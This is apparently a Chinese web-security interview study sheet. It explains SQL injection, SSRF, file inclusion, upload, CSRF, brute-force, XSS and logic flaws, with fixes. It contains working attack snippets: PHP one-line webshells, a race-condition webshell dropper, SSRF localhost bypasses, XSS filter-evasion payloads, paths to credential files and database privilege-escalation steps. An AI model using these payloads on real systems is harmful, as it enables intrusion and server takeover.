# TOP10

```
SQL注入漏洞
原理：攻击者通过构造恶意 SQL 语句注入到应用程序的数据库中，从而获取敏感信息或控制数据库服务器。
检测方式：使用工具或手工输入特殊字符并观察是否有异常响应。
修复措施：采用参数化查询和存储过程等，对用户输入进行严格校验和过滤防止 SQL 注入攻击。
```

```
XSS（跨站脚本攻击）漏洞
原理：攻击者在网页中插入恶意代码，利用浏览器执行这些代码来窃取用户信息或进行其他攻击。
检测方式：使用工具或手动在输入框中输入特殊字符并查看是否有异常响应。
修复措施：对所有输入输出的内容进行过滤或转义，实现输入输出的安全。
```

```
CSRF（跨站请求伪造）漏洞
原理：攻击者通过在受害者浏览器上发起伪造的请求，利用受害者身份在应用程序上执行恶意操作。
检测方式：使用工具或手动模拟请求并检查其是否被识别。
修复措施：使用 token 或随机数作为身份认证码，并对来源请求进行有效识别，防止 CSRF 攻击。
```

```
RCE（远程代码执行）漏洞
原理: 攻击者通过包含恶意序列化对象或计算机网络协议栈上的错误实现来在目标服务器上执行任意代码。
检测方式：使用工具扫描或手动测试可能的输入点，以尝试构造恶意请求并观察是否出现异常响应。
修复措施：限制代码执行权限、加强安全验证、禁用危险函数，限制远程服务访问权限。
```

```
未授权访问漏洞
原理: 应用程序没有正确实施权限控制，允许攻击者访问并执行不应该被许可的敏感操作。
检测方式：手动测试不同的角色是否能够访问不应该被允许的操作。
修复措施：修改应用程序代码，增加身份认证和权限控制机制、及时更改默认密码等。
```

```
XML外部实体注入漏洞
原理：攻击者将外部实体引用注入XML处理器中，从而获取敏感信息或利用业务逻辑漏洞。
检测方式：模拟攻击，检查代码是否存在可注入漏洞。
修复措施：禁止使用解析外部实体、对输入数据进行严格校验、升级库版本支持。
```

```
命令注入漏洞
原理：攻击者通过在应用程序中插入包含恶意指令的参数来进行攻击，从而实现远程执行命令并获取服务器权限。
检测方式：使用工具或手工输入特殊字符并观察是否有异常响应。
修复措施：用参数化查询代替拼接SQL语句，并对用户输入进行严格过滤和转义。建议使用沙箱技术、限制系统命令行设置等方式防止命令注入攻击。
```

```
密码猜解漏洞
原理：攻击者通过枚举密码或社交工程手段试图猜测用户密码，从而获取敏感信息或控制帐户。
检测方式：评估密码策略是否有效。
修复措施：设置复杂的密码策略，增加登录失败尝试次数限制，并启用两步验证等措施。
```

```
不安全反序列化漏洞
原理：攻击者通过发送精心构造的序列化对象来执行未经授权的代码并影响应用程序。
检测方式：应用程序的代码审查，掌握可能受到攻击的反序列化路径。
修复措施：禁止从未知来源加载对象，通过加入白名单/黑名单限制反序列化类型，需要在实际场景中细致考虑。
```

```
组件未更新漏洞
原理：组件未更新漏洞是指在应用程序或系统中使用了已知存在安全漏洞的第三方组件或库。攻击者可能利用组件的这些漏洞来对系统进行攻击与入侵。
检测方式：手动检测：直接查看应用程序、插件、库和操作系统版本，并将其与公开已知的漏洞数据库进行比较。
自动化扫描：使用第三方漏洞扫描工具，在应用程序或系统中发现已知组件漏洞。
修复：检查和更新：记录并评估组件并及时替换已知漏洞组件。
监视漏洞：定期滚动使用组件，维护适当的升级计划，及时发现漏洞和补丁。
安装新版本：下载和安装第三方组件的最新版本，通常这些版本都修复了之前版本的漏洞。
代码审计：通过对组件源代码的分析和审核来检查是否存在其他漏洞，并为必要更新提供数据支持。
网络隔离：可以使用网络隔离技术或虚拟容器来减少外部组件对应用程序或系统的影响。
```



# SQL注入

```
1:时间注入禁用了sleep函数怎么办
使用其他延时函数来进行SQL注入,如benchmark、waitfor、delay

2:sql注入getshell方法
最高用户权限 root (DBA)
网站的根路径
secure_file_priv  为空

3:布尔注入函数
ascii()
substr()
hex()

4:sql注入绕WAF
使用特定的Http头：通过修改HTTP头，可以让WAF无法识别SQL注入攻击，从而绕过WAF检查；
使用特定的请求方法：可以使用GET、HEAD等请求方法，使用其他不常用的请求方法，比如PUT、PATCH等；
使用特定的请求路径：可以使用不常见的请求路径，使WAF无法识别；
使用特定的请求参数：可以使用不常见的请求参数，使WAF无法识别；
使用特定的请求数据：可以使用不常见的请求数据，使WAF无法识别；
使用混淆技术：可以使用混淆技术，比如使用URL编码、Base64编码、十六进制编码等；
使用特定的请求端口：可以使用不常见的请求端口，使WAF无法识别；
双写，大小写，注释，等价函数替换

5:报错注入函数
updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数
extractvalue()      是mysql对xml文档数据进行查询的xpath函数
floor()             mysql中用来取整的函数
exp()               此函数返回e(自然对数的底)指数X的幂值

6:udf提权的前置条件
mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\Lib\Plugin\文件夹，然后将udf.dll导入到该目录。
mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。
掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限。
可以将udf.dll写入到相应目录的权限。

7:sqlserver提权方法
xp_cmdshell提权、sp_OACreate提权（Ole提权）、沙盒提权、写计划任务提权

8:sqlmap写os-shell原理
本质就是写入两个shell文件，其中的一个可以让我们用来执行命令，而另外一个，如果在网站访问的话，可以让我们可以上传文件。
利用条件:
知道网站的物理路径
高权限数据库用户
secure_file_priv无限制
网站路径有写入权限

9:sqlmap延时注入利用哪个参数
用 --time-sec 3 参数设置基于时间延迟注入中延时时长 默认为5秒

10:sql注入预编译原理
预编译是利用占位符替代参数值，预先建立语法树的过程。注入的恶意SQL语句只会被视为参数，参与不了SQL语句的语法树构建，也就无法改变其语法结构，也就无法达到编译恶意语句的目的，向那种排序字段就不能预编译，排序字段像order by就不能当作参数

11:如何突破注入时字符被转义：
宽字符注入、hex 编码绕过。

12:SQL注入防护方法：
1. 使用安全的API
2. 对输入的特殊字符进行Escape转义处理
3. 使用白名单来规范化输入验证方法
4. 对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
5. 服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。
5. 规范编码、字符集。

13:为什么参数化查询可以防止SQL注入？
原理：使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分也执行，是在数据库完成sql指令的编译后才套用参数运行。
简单的说：参数化能肪注入的原因在于语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑。

14:盲注是什么，怎么盲注？
盲注是在SOL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。
盲注的手段有两种:
一个是通过页面的返回内容是否正确(boolean-based),来验证是否存在注入;
一个是通过 sq|语句处理时间的不同来判断是否存在注入(time- based),可以用benchmark, sleep 等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。

15:宽字节注入产生原理以及根本原因
产生原因：
在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，由于OXBF27是两个字符，在PHP中addslsh和magic _quotes gpc开启时，会对0x27单引1号进行转义，因此0xb627会变成0xbrfsc27。
而数据进入数据库中时，由于0XBF5C是一一个另外的字符， 因此\转义符号会被前面的bf带着"吃掉"，单引号由此逃逸出来可以用来闭合语句。
根本原因：
character_ set client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、 mb convert encoding使用不当。
解决办法：
统一数据库、Web 应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。或对数据进行正确的转义，如mysql_real_escape_string + mysql_set_charset的使用。

16:mysql 的网站注入5.0以上和5.0以下有什么区别
5.0以下没有information. schema这个系统表，无法列表名等，只能暴力跑表名;
5.0以下是多用户单操作，5.0以 上是多用户多操作。

17:发现demo.jsp?uid=110注入点，
你有哪几种思路获取webshell,哪种是优选
有写入权限的，构造联合查询语句使用using INTO OUTFILE ，可以将查询的输出重定向到系统的文件中，这样去写入WebSheill使用sq|map -os-shell原理和上面一种相同，来直接获得一个Shell. 这样效率更高。
通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传Shell。

18:SQL里面只用update怎么利用？
先理解这句SQL: UPDATE user SET password= "MD5($password)',homepage=' $homepage' WHERE id='$id'
如果此SQL被修改成以下形式，就实现了注入。
方式一：
修改homepage值为http://xxx.net' userlevel='3 之后SQL语句变为: UPDATE user SET password='mypass',
homepage='http://xxx.net' , userlevel='3 ' WHERE id='$id' userlevel为用户级别
方式二：
修改password值为mypass)' WHERE username= 'admin'# 之后SQL语句变为: UPDATE user SET password='MD5(mypass)' WHERET username= 'admin'#)' , homepage='$homepage' WHERE id=' $id'
方式三：
修改id值为' OR username= 'admin' 之后SQL 语句变为: UPDATE user SET password=' MD5($password)';
homepage= '$homepage' WHERE id=" OR username= 'admin'

19:SQL注入写shell的条件
当前用户具有dba权限 
找到网站绝对路径 
网站有可写目录 
mysql的配置secure_file_priv为空

20:MySQL提权
1:写入webshell
into outfile 写shell
前提条件：
1、知道网站物理路径
2、高权限数据库用户
3、load_file() 开启 即 secure_file_priv 无限制
4、网站路径有写入权限

2:日志文件写shell
1、Web 文件夹宽松权限可以写入
2、Windows 系统下
3、高权限运行 MySQL 或者 Apache

3:UDF提权
4:MOF提权
```



# SSRF

```
介绍
SSRF服务器端请求伪造）是由攻击者构造形成由服务器端发起请求的一个漏洞。攻击者可以利用SSRF漏洞，通过服务器端发起请求来攻击内网中的其他系统。
原理
攻击者向存在SSRF漏洞的服务器发送请求，请求中包含了攻击者想要访问的内部资源的URL。
服务器接收到请求后，解析URL并向该URL发起请求。
服务器获取到内部资源的响应，然后将响应返回给攻击者。
这样，攻击者就可以通过SSRF漏洞访问到内网中的其他系统，甚至可以执行一些命令。
修复
输入校验：对所有用户输入的数据进行校验，禁止输入URL，或者只允许输入符合特定格式的URL。
白名单：只允许服务器向白名单中的URL发起请求，拒绝所有其他的URL请求。
禁用不必要的协议：例如，禁用file协议和gopher协议，这些协议常常被用于SSRF攻击。
网络隔离：将服务器与内部网络隔离，防止服务器能够访问到内部网络中的其他系统。

1:ssrf和csrf区别
CSRF是用户端发起请求，攻击者利用用户的Cookie信息伪造用户请求发送至服务器；而SSRF是服务端发起的请求，攻击者通过构造指定URL地址获取网页文本内容、加载指定地址的图片、下载等方式，利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。

2:漏洞函数
file_get_content() 、fsockopen() 、curl_exec()

3:绕过方法
url解析规则
IP地址进制转换
302跳转
DNS重绑定
@符
对于一个 url 的访问实际上是以 @符后为准的，比如说 xxxx.com@10.10.10.10，则实际上访问的是 10.10.10.10 这个地址

302跳转
网址后加 xip.io
其原理是例如 10.10.10.10.xip.io 会被解析成 10.10.10.10

数字IP Bypass
IP进制转换/Enclosed Alphanumerics/特殊地址

进制转换
ip 转换为八进制十进制十六进制这种，同样也可以正常访问
Enclosed Alphanumerics

由英文字母数字组成的Unicode字符集，位于圆圈，括号或其他未封闭的封闭空间内，或以句号结尾。如下

ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
①②⑦.⓿.⓿.①  >>> 127.0.0.1
特殊地址:

http://0/  # 0.0.0.0可以直接访问到本地
http://127。0。0。1  # 绕过后端正则规则
http://localhost/

短网址绕过

添加端口号
http://127.0.0.1:8080


协议限制绕过
当url协议限定只为http(s)时，可以利用follow redirect 特性
构造302跳转服务，
结合dict:// file:// gopher://

4:ssrf利用
内网资源访问
url?url=http://内网的资源url
伪协议
file:///
dict://
sftp://
ldap://
tftp://
gopher://

漏洞危害
内部资产暴露：攻击者可以通过伪造的请求访问内部资源，包括数据库、文件系统、配置文件、读取本地文件等。
敏感信息泄露：攻击者可以利用该漏洞获取敏感信息，例如访问受限 API、执行未经授权的操作等。
进行攻击：攻击者可以通过伪造的请求向其他系统发起攻击，例如内网端口扫描、攻击内网应用、内网Web应用指纹识别、利用其他漏洞等。
恶意代码执行
攻击者可以构造特定的请求，利用服务器端漏洞执行恶意代码，例如执行远程命令、上传文件等
SSRF漏洞可以与CSRF漏洞结合，使攻击者能够通过受害者的浏览器发起恶意请求，达到控制受害者账户等目的。
```



# 文件包含

```
原理:
因为将被包含的文件设置为变量，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
文件包含函数没有经过过滤，可以被攻击者控制，包含其他恶意文件，导致了执行恶意的代码。

函数:
include()：找不到被包含文件，报错，但会继续运行脚本；
include_once()：与include（）类似，区别在于，当重复调用同一文件时，程序只调用一次；
require()：找不到被包含文件，报错，并且停止运行脚本；
require_once() ：与require类似，区别在于，当重复调用同一文件时，程序只调用一次；

include_once()和require_once()这两个函数只包含一次，适用于在脚本执行期想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

文件包含特征:
?page=
?file=
?home=

利用条件:
1. included等函数通过动态变量的方式引入需要包含的文件;
2. 用户能够控制该动态变量.
3. 被包含的文件可被访问

本地文件包含:
能够打开并包含本地文件的漏洞,被称为本地文件包含漏洞
远程文件包含:
如果PHP的配置选项 allow url include为ON的话,则 include/require函数是可以加载远程文件的,这种漏洞被称为远程文件包含漏洞( Remote File Inclusion,简称RFⅠ)。
如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。
allow_url_fopen = On（是否允许打开远程文件)
allow_url_include = On（是否允许include/require远程文件）

常用的本地文件绝对路径:
Windows
c:\boot.ini // 查看系统版本

C:\Windows\System32\config\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信

Linux
/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/etc/resolv.conf

/root/.ssh/known_hosts

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件

1:文件包含危害
敏感信息泄露（网站源码、配置文件、系统日志等）
配合上传漏洞获取Webshell（图片马等）
执行任意脚本代码（远程执行.php脚本代码）
控制服务器（能执行任意命令）


2:如何修复
严格的输入验证：验证和过滤所有用户提供的输入，特别是那些用于文件路径和名称的输入。
限制文件访问：限制应用程序可以包含和执行的文件类型，避免执行不安全的文件。
安全配置：确保Web服务器和应用程序的配置安全，例如禁用远程文件包含。
```



# 文件上传

```
由于代码没有严格限制用户上传文件后缀以及文件类型，导致攻击者向某个可通过Web访问的目录上传任意脚本文件，并能够将这些文件传递给解释器，在远程服务器上执行任意脚本
1.文件上传的概念
将客户端数据以文件形式封装，通过网络协议发生到服务端，文件在服务端被解析，最终作为真实文件保存在服务端硬盘上；

2.产生漏洞的原因
服务器配置不当
文件上传限制被绕过
开源编辑器的上传漏洞
文件解析漏洞导致文件执行

3.文件上传漏洞的危害
攻击者通过上传恶意文件传递给解释器执行，进而可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理、命令执行等恶意操作，甚至控制网站、服务器；这个恶意文件称为WebShell；

4.文件上传漏洞可能存在的位置
图片上传功能
头像上传功能
文档上传功能

5.文件上传漏洞检测方式
客户端JavaScript检测
服务端MIME类型检测
服务端目录路径检测
服务端文件扩展名检测
服务端文件内容检测

绕过方式
黑名单
后缀大小写
空格绕过
点绕过
::$DATA绕过
Apache解析漏洞绕过
.htaccess文件绕过
.user.ini文件绕过
特殊后缀绕过 
双写绕过

白名单
%00截断绕过
0x00截断绕过
需注意的是0x00截断并非直接加0x00，而是要加空格并将空格对应的20编码改为00

防后缀绕过相关的函数
eldot($s)

        删除字符串$s末尾的点，直到字符串末尾不是点为止；

in_array(a,b,true)

        判断a值是否在数组b中，true表示需要比较类型，默认为false；

intval(a,b)

        把a当作b进制数返回对应十进制整数，转换失败返回0，b=0时自动检测进制数，如intval(“0x12”,0)返回18，intval(“44”,3)返回0，intval(s),将字符串s转换为十进制整数，如intval(“123abs”)返回123；

strrchr(a,b)

        返回字符串a从最后一个字符b处起后面的子串，b为单个字符或字符串的首个字符或ASCLL码对应的单个字符；

strtolower(s)

        字符串s变小写并返回；

strrpos(a,b,c)

        返回子串b在字符串a中最后一次出现的位置，c指定从字符串a的c位置开始匹配，默认为0即从头开始；strpos返回首次出现的位置，strripos返回最后一次出现的位置并且匹配时不区分大小写，i表示不区分大小写；

str_ireplace(a,b,c,d)

        用b替换c中的a，d限定最大替换次数；

strstr(a,b,c)

        返回a中首个b出现的位置起后面的子串，c为true时返回前面部分；

substr(a,b,c)

        返回字符串a的第b+1个字符起c长度的子串；

trim(s)

        去除s首位空白字符并返回；

文件内容——文件幻数
原理

        通过检测上传文件内容开始处的文件幻数来判断文件是否合法，通常根据文件的前十个字节即可确定文件类型；

绕过

        ①在文件内容开头写文本GIF89a即可绕过对文件幻数的检测；

        ②制作图片马绕过，使用命令copy 1.jpg/b + 2.php/a 3.jpg可将1.jpg文件和2.php文件合成图片马3.jpg文件；

文件内容——shell检测
原理

        检测文件内容的代码判断是否合法；

绕过

        使用JS格式替换php格式的一句话木马；

检测到非法：<?php @eval($_POST['cmd']);?>
可替换为：<script language="php">eval($_POST['cmd'];<?script>

文件内容——图片二次渲染
原理

        包含恶意代码的图片被重新生成(渲染)，导致代码失效无法执行；

绕过

        代码注入绕过：将经过渲染的上传图片与未渲染的图片对比(使用工具winhex)，找出渲染前后未发生改变的地方插入恶意代码，即在不破坏文件渲染的情况下找一空白区(一般是图片的注释区)进行代码填充，这样既能保证文件完整也能上传恶意代码文件；

竞争条件
原理

        文件上传后服务器对文件进行非法检测，若合法保留文件，否则删除文件；

绕过

        上传非法文件后，在文件被删除前访问该文件执行恶意代码，可在服务器生成一个websell文件，通过新的webshell文件攻击服务器；

//上传的非法文件内容如下，可新生成一个webshell文件
<?php fputs(fopen('test.php','w'),'<?php @eval($_POST['cmd']);?>');?>

1:如何修复
设置白名单
文件命名策略
限制文件大小
检查文件内容
文件权限控制
```



# CSRF

```
原理
CSRF攻击的原理基于受害者在已登录的情况下，通过在受信任的网站上执行未经用户授权的操作。攻击者利用受害者在浏览器中已经建立的会话（session），诱导受害者访问特定页面或点击恶意链接，从而触发浏览器向目标网站发送伪造的请求，执行恶意操作。

CSRF漏洞危害
篡改目标网站上的用户数据
盗取用户隐私数据
作为其他攻击向量的辅助攻击手法
传播CSRF蠕虫

1:如何修复
手动或工具监测
增加二次验证机制 再次验证用户口令或者再次验证类似验证码等随机数
校验HTTP Referer字段
增加Token

2:csrf和xss区别
CSRF与XSS听起来很像，但攻击方式完全不同。XSS攻击是利用受信任的站点攻击客户端用户，而CSRF是伪装成受信任的用户攻击受信任的站点。

3:csrf和ssrf区别
CSRF是用户端发起请求，攻击者利用用户的Cookie信息伪造用户请求发送至服务器；而SSRF是服务端发起的请求，攻击者通过构造指定URL地址获取网页文本内容、加载指定地址的图片、下载等方式，利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。
```



# 枚举猜解

```
原理
暴力破解是一种基于试错的攻击方式，其中攻击者使用计算机程序或手工方法，通过尝试大量可能的用户名和密码组合来尝试破解密钥或密码。暴力破解攻击通常会在短时间内连续尝试多个密码，以尝试猜测正确的密码。

漏洞产生的主要原因是
1. 没有强制用户设置复杂密码，比如密码由数字，字母，特殊字符构成
2.没有使用安全验证码
3.没有对用户的登录进行行为限制，如连续5次输入错误后锁定账户一段时间
4.没有使用双因素认证，例如手机验证码，双重密码等


如何修复
设置强密码策略：包括密码长度、复杂度要求以及定期更换；
实施多因素认证：除密码外，增加手机验证码、指纹识别、硬件令牌等其他验证手段；
限制登录尝试次数及速度：当短时间内错误登录次数过多时，应暂时锁定账户或延长下一次尝试登录的时间间隔；
使用验证码：在登录过程中加入图片验证码或滑动验证码，增加自动猜测难度；
监控异常登录行为：实时监控登录来源、时间、频率等信息，发现异常立即预警或阻断。

危害：
目的主机账号猜解成功后，攻击通常利用该账号做如下操作：
1、攻击者通过泄露账户非法登录主机，盗取用户数据；
2、攻击者通过泄露账户非法登录主机，注入病毒程序，执行挖矿或勒索，如gobleImposter勒索病毒、飞客蠕虫；
3、攻击者通过泄露账户非法登录主机，作为跳板机攻击其他主机；

暴力破解的方法
穷举法
字典式攻击
彩虹表攻击

暴力破解的工具有哪些
burp suite、Brutus、Medusa、Hydra、Ncrack、John the Ripper、Aircrack-ng 和 Rainbow等工具

提高暴力破解漏洞效率你会从哪些方面入手
做信息收集优化字典
确认用户名在确认密码
提高线程数
GPU 加快暴力破解尝试

暴力破解漏洞测试流程吗
确认登录接口的脆弱性
对字典进行优化
工具自动化操作

字典如何优化
根据注册提示信息进行优化
对目标站点进行注册,搞清楚账号密码的一些限制，比如目标站点要求密码必须是6位以上,字母数字组合，则可以按照此优化字典，比如去掉不符合要求的密码。
使用频率高的密码
如爆破的是管理后台，往往这种系统的管理员是admin/administrator/root的机率比较高，可以使用这三个账号+随便一个密码，尝试登录，观看返回的结果。

常见的弱口令漏洞有哪些
ftp弱口令
Ssh弱口令
Telnet弱口令
Mysql弱口令
RDP弱口令
Ridis弱口令

常见的登录暴力破解字典构建方式有哪些
用户名+生日
用户名@生日
用户名+特定字符
用户名@年份
姓名全拼+生日
姓名全拼@生日
姓名全拼@特定字符
用户名@domain
用户名@domain+特定字符
domain@特 定字符
键盘固定顺序及变形
各种系统的初始口令

暴力破解除了在登录还有其他的使用场景吗
子域名暴力破解
目录扫描爆破
登录暴力破解
验证码暴力破解

不安全的验证码常见问题有哪些
1.客户端
1、使用前端js实现验证码(纸老虎)；
2、将验证码在cookie中泄露,容易被获取；
3、将验证码在前端源代码中泄露,容易被获取；

2.服务端
1、验证码在后台不过期,导致可以长期被使用；
2、验证码校验不严格,逻辑出现问题；
3、验证码设计的太过简单和有规律,容易被猜解。

token可以防止暴力破解漏洞吗
1、可以提高安全性，但不能防止暴力破解漏洞。一般来说Token在防止CSRF上会有比较好的功效。
2、一般来说token是以type= ‘hidden’ 的形式输出在表单中，在提交的认证的时候一起提交，并在后台对其进行校验。但是，由于其token值输出在了前端源码中，容易被获取，就无法防止暴力破解。
```



# XSS

```
原理
是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本,通常是由JavaScript编写的恶意代码当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的

xss危害
（1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。
（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。
（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。
（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。

xss类型
1:反射型XSS
2:存储型XSS
3:DOM型XSS

判断XSS类型
发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。

XSS漏洞修复
1、在服务端进行输入检测，过滤特殊字符
2、对输出内容进行编码转义
3、在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。
4、设置httponly为true


如何验证存在xss漏洞
第一步，寻找用户可控的参数（输入点）
第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理
第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过
常用的测试方法
123456'"<>

防御xss
1、对所有的输入值进行编码
2、使用白名单的过滤，如手机号只能是11位1开头的数字
3、使用黑名单，将各种特殊字符进行过滤（容易被绕过）
4、设置Cookie的httpOnly为true
5、使用w3c提出的CSP(Content Security Policy，内容安全策略)，定义域名白名单（）这样就无法加载第三方js了

xss绕过安全限制
以下只做思路展示
1、过滤script的情况(只过滤一次)
<scrscriptipt>alert(1)</scscriptript>
<ScRipt>alert(1)</ScRipt>
2、对不能构造script标签的情况下
使用事件进行绕过
<input  value='123' onclick='alert()'>
超链接绕过
<a src=javascript:alert()>123</a>
```



# 逻辑漏洞

```
逻辑漏洞产生的位置
1.登录处
2.业务办理处
3.验证码处
4.支付处
5.密码找回处

原理&产生原因
是一种安全问题，它发生在软件的逻辑设计不够严密或过于复杂时，导致程序在处理某些逻辑分支时出现错误，导致程序容易受到攻击，如被绕过、修改或中断

常见逻辑漏洞
交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。

登录处存在的逻辑漏洞
1:可以暴力破解用户名或密码
没有验证码机制，没有根据用户名限制失败次数，没有根据ip限制失败次数等等。
2:session没有清空
登出后服务器端的session内容没有清除，因此客户端重新带回登出前的session，也能够达到重新登录。
通常思路：
在登录退出后，拿退出前的session，重新访问需要登录的界面。

业务处理处存在的逻辑漏洞
1:水平越权
通常说的越权一般是修改get或者post参数，导致的查看到他人的业务信息，一般看订单处，个人信息处等位置的参数。
通常思路：
拿2个账号，修改账号1的get或post参数给账号2。
2:篡改手机号
在需要手机号的短信验证处，抓包修改手机号，可能做到非本账号手机号获取能够编辑本账号的验证码。
通常思路：
抓包，查看get或者post参数存在手机号的地方，进行修改。

验证码处存在的逻辑漏洞
1.登录验证码未刷新
没有清空session中的验证码信息。
通常思路：
1.抓包多次重放，看结果是否会返回验证码错误，如没有返回验证码错误则存在未刷新
2.观察检验的处理业务，如果验证码和用户名密码是分2次http请求校验，则也可以爆破用户名和验证码。

2.手机或邮箱验证码可爆破
没有对应的手机号或邮箱，但如果验证码纯数字4,5位左右，没有次数校验，可以爆破
通常思路：
拿自己的手机号或邮箱先获取验证码查看验证码格式，之后多次提交错误的看是否有次数现在，没有就爆破。

3.手机或邮箱验证码回显到客户端
在发送给手机或者邮箱验证码时，会在response包中有验证码，因此不需要手机和邮箱就可以获取验证码。
通常思路：
发送验证码时抓包，看返回包。

4.修改response包绕过判定
在输入错误的验证码时会返回false之类的字段，如果修改response中的false为true，会识别为验证通过。
通常思路：
抓包，选择do intercept-> response to this request ,放包，抓到下一个包就是response的包，可以修改，重放。

5.验证码轰炸
在请求发送验证码的数据包中有字段控制验证码的发送，如请求包某字段true就是发送验证码，我们直接进行重放攻击。
通常思路：
抓取发送验证码的请求包，查找控制验证码发送的字段，放入重放攻击模块进行重放攻击。
防御措施：
有的只在前端验证，比如60s后才能重新发送短信验证码，但是后端没有验证，可以让他一直重发，耗尽他短信池的流量，一般用来做DDoS。


支付处存在的逻辑漏洞
1.修改商品编号
如果业务是通过商品编号来判断价格的话，可能存在只修改A商品编号为B商品编号，做到以A商品的价格购买B商品
通常思路：
先准备2个商品的编号，将其中一个改为另一个
条件竞争
通过条件竞争使余额达到负数，从而买多个商品
通常思路：
支付处，多线程请求付款确认，结果如果余额为负数，则存在该漏洞

2.金额修改
金额直接写在了post或者get请求中，对其进行修改达到修改了商品金额的效果
通常思路：
抓包修改金额的字段

3.商品数量修改
在购买时，如果一个商品为负数，那么它的价格则会是负数，如果购买多种商品，将其中一个设为负数，降低整体的价格
通常思路：
购物车里选取多个商品，修改其中一个商品的数量，在购买后查看最终的价格

4.通过前端限制限购商品
有些商品限购1个，但是判定是通过前端，因此可以抓包后修改数量
通常思路：
抓取限购数量内的包，抓取后修改个数，重放

5.充值中放弃订单未失效
在充值中选取大额充值订单，放弃订单，获得订单号，之后充值小额订单，拿到充值成功的界面，将订单号修改为放弃的大额订单，观察是否成功
通常思路：
看看充值的时候是否有订单号字段，如果有在成功界面修改为未支付的订单号，观察充值是否成功

密码找回处的逻辑漏洞
1.验证码处的逻辑漏洞
1.登录验证码未刷新
2.手机或邮箱验证码可爆破
3.手机或邮箱验证码回显到客户端
4.修改response包绕过判定

2.修改发送的验证的目标为攻击者的邮箱或手机
在找回密码处，如果字段带上用户名，校验的邮箱或者手机号，将邮箱或者手机号改为自己的，如果自己的能够收到验证码并重置密码，则该漏洞存在
通常思路：
抓包，注意找回密码流程中的邮箱号或者手机号字段，修改其为自己即可

3.session覆盖
已知A的手机号，不知B的手机号，找回A的密码，输入验证码后到了设置新密码设置界面。这时在同一浏览器下重开窗口找回B的密码，获取验证码，刷新A设置新密码的页面，如果此时修改的是B账号的密码，则存在漏洞
通常思路：
准备2个账号，测试步骤如上所述
在邮箱收到找回密码连接时，依然可以使用该思路

4.弱token爆破
有些时候通过找回密码的时候填邮箱，邮箱此时会收到一个带有token的链接，点击链接就能跳转到重置密码的页面，如果token是base64，时间戳，位数较低的随机数则可以爆破
通常思路：
正常找回流程获取重置密码的url，了解token的规则后，爆破其他邮箱的重置密码url

5.密码找回流程绕过
在找回密码处，一般会有三个步骤页面，页面1找回用户的填写，页面2找回时的手机号短信验证码填写，页面3填写新密码，如果填好页面1，直接访问页面3能够重设密码的话，则会存在该漏洞
通常思路：
在设置好找回用户后，直接访问重设密码的url页面

如何避免逻辑漏洞的产生
在系统生命周期里引入威胁建模避免逻辑漏洞的产生。引入威胁建模的好处如下：
1.进行安全设计。
2.更充分的对资源进行调研；更合理的对于安全、开发以及其他任务排定优先级。
3.将安全和开发结合到一起，更好的互相理解以及构建系统
4.确定威胁和兼容性的需求，并且评估它们的风险。
5.定义和构建需求控制。
6.平衡风险、控制和易用性。
7.基于可接受的风险，确定哪块的控制是不需要的。
8.文档化威胁和缓解措施。
9.确保业务需求（或目标）在面对恶意参与者、事故或其他影响因素时得到充分保护。
10.定义安全测试用例来验证安全方面的需求。

修复逻辑漏洞
1.代码层面进行修复，完善逻辑，消除逻辑漏洞。
2.做过滤器，执行操作时对权限进行全局校验（每次调用某个接口时，可先对权限进行校验）。
```


